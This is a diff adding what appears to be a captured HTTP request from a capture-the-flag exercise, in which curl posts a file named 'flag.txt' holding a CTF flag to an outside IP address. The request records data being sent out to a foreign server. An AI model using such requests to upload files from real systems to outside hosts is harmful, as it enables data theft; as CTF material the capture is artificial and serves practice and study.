@@ -1,0 +1,15 @@
+POST https://165.227.109.154/ HTTP/1.1
+Host: 165.227.109.154
+User-Agent: curl/7.54.0
+Accept: */*
+Content-Length: 218
+Expect: 100-continue
+Content-Type: multipart/form-data; boundary=------------------------8866e5f1556ec898
+
+--------------------------8866e5f1556ec898
+Content-Disposition: form-data; name="file"; filename="flag.txt"
+Content-Type: text/plain
+
+DERP{WayToCatchMyForeignServer}
+
+--------------------------8866e5f1556ec898--
